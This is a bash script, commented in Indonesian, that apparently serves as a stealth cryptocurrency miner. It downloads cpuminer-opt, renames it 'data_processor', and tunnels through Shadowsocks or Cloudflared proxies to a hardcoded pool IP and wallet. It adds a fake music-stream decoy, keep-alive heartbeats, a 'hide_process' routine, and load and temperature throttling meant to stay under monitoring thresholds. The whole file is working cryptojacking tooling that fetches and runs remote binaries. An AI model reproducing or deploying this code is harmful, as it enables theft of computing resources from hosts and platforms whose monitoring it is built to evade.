#!/bin/bash
set -euo pipefail

LOGFILE="ss_fallback_miner.log"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

FAKE_NAME="data_processor"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://104.248.150.108:9933"
ALGO="power2b"
THREADS=$(nproc)

CLOUDFLARED_BIN="./cloudflared"
SS_LOCAL="./ss-local"
SS_CONFIG="./ss-config.json"
TOR_CMD=""

ARCH=$(uname -m)
ARCH_URL=""
case "$ARCH" in
    x86_64) ARCH_URL="cloudflared-linux-amd64" ;;
    aarch64) ARCH_URL="cloudflared-linux-arm64" ;;
    armv7l) ARCH_URL="cloudflared-linux-arm" ;;
    *) echo "[!] Unsupported architecture: $ARCH" | tee -a "$LOGFILE"; exit 1 ;;
esac

# Unduh Cloudflared
if [ ! -f "$CLOUDFLARED_BIN" ]; then
    echo "[*] Downloading Cloudflared [$ARCH]" | tee -a "$LOGFILE"
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/$ARCH_URL" -O cloudflared
    chmod +x cloudflared
fi

# Unduh ss-local (Shadowsocks client)
if [ ! -f "$SS_LOCAL" ]; then
    echo "[*] Downloading Shadowsocks client (ss-local)..." | tee -a "$LOGFILE"
    wget -qO ss-local https://github.com/shadowsocks/shadowsocks-rust/releases/download/v1.17.0/shadowsocks-v1.17.0.x86_64-unknown-linux-gnu.tar.xz
    tar -xf ss-local -C . || true
    chmod +x ss-local || true
fi

# Buat konfigurasi Shadowsocks (isi default dummy)
cat <<EOF > "$SS_CONFIG"
{
  "server": "1.2.3.4",
  "server_port": 8388,
  "password": "your-password",
  "method": "aes-256-gcm",
  "local_address": "127.0.0.1",
  "local_port": 1080
}
EOF

echo "[*] Starting Shadowsocks local proxy..." | tee -a "$LOGFILE"
$SS_LOCAL -c "$SS_CONFIG" > /dev/null 2>&1 &
sleep 2

# Tes Shadowsocks
if curl --socks5-hostname 127.0.0.1:1080 https://api.ipify.org --max-time 5 >> "$LOGFILE" 2>&1; then
    echo "[+] SOCKS5 via Shadowsocks active." | tee -a "$LOGFILE"
    export ALL_PROXY=socks5h://127.0.0.1:1080
    TOR_CMD="env ALL_PROXY=socks5h://127.0.0.1:1080"
else
    echo "[!] Shadowsocks failed. Trying Cloudflared fallback..." | tee -a "$LOGFILE"

    for PORT in 5353 5858 9050; do
        echo "[*] Trying Cloudflared on port $PORT" | tee -a "$LOGFILE"
        $CLOUDFLARED_BIN proxy-dns --address 127.0.0.1 --port "$PORT" --upstream https://1.1.1.1/dns-query >> "$LOGFILE" 2>&1 &
        sleep 2
        if curl --socks5-hostname 127.0.0.1:$PORT https://api.ipify.org --max-time 5 >> "$LOGFILE" 2>&1; then
            echo "[+] SOCKS5 via Cloudflared active on port $PORT" | tee -a "$LOGFILE"
            export ALL_PROXY=socks5h://127.0.0.1:$PORT
            TOR_CMD="env ALL_PROXY=socks5h://127.0.0.1:$PORT"
            break
        else
            echo "[!] Port $PORT failed. Trying next..." | tee -a "$LOGFILE"
            kill $(lsof -t -i:$PORT) 2>/dev/null || true
        fi
    done
fi

if [ -z "$TOR_CMD" ]; then
    echo "[!] SOCKS5 proxy failed entirely. Proceeding without it." | tee -a "$LOGFILE"
fi

# Unduh miner
if [ ! -f "$FAKE_NAME" ]; then
    echo "[*] Downloading miner..." | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

fake_music_stream() {
    local songs=("lofi chill beat" "jazzy sunset" "ambient rain" "coffee shop music" "vaporwave vibes")
    SONG="${songs[$RANDOM % ${#songs[@]}]}"
    echo "[*] Playing: $SONG - $(date)" >> "$LOGFILE"
    curl -s --max-time 5 https://example.com/fake_music.mp3 -o /dev/null || true
    sleep 30
}

keep_alive() {
    while true; do
        echo "[*] Heartbeat $(date)" >> "$LOGFILE"
        (ping -c1 127.0.0.1 >/dev/null 2>&1 &)
        (ls /proc >/dev/null 2>&1 &)
        sleep 57
    done
}

check_cpu_load_or_temp() {
    local MAX_LOAD=6.0
    local MAX_TEMP=75

    if [ -f /sys/class/thermal/thermal_zone0/temp ]; then
        CPU_TEMP=$(cat /sys/class/thermal/thermal_zone0/temp)
        CPU_TEMP=$((CPU_TEMP / 1000))
        if [ "$CPU_TEMP" -gt "$MAX_TEMP" ]; then
            echo "[!] CPU overheat: $CPU_TEMP°C. Cooling down..." | tee -a "$LOGFILE"
            killall -q "$FAKE_NAME" || true
            sleep 60
        fi
    fi

    LOAD=$(awk '{print $1}' /proc/loadavg)
    if (( $(echo "$LOAD > $MAX_LOAD" | bc -l) )); then
        echo "[!] CPU load too high: $LOAD. Cooling down..." | tee -a "$LOGFILE"
        killall -q "$FAKE_NAME" || true
        sleep 45
    fi
}

hide_process() {
    echo 0 > /proc/$$/oom_score_adj 2>/dev/null || true
    renice -n 19 -p $$ > /dev/null 2>&1 || true
}

run_miner() {
    hide_process
    SECONDS=0

    while true; do
        echo "[*] Starting main cycle @$(date)" >> "$LOGFILE"
        fake_music_stream
        sleep 3

        $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
        PID=$!

        keep_alive &
        KPID=$!

        while sleep 30; do
            check_cpu_load_or_temp
            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crash. Restarting @$(date)" >> "$LOGFILE"
                kill $KPID 2>/dev/null || true
                sleep 5
                break
            fi
        done
    done
}

run_miner
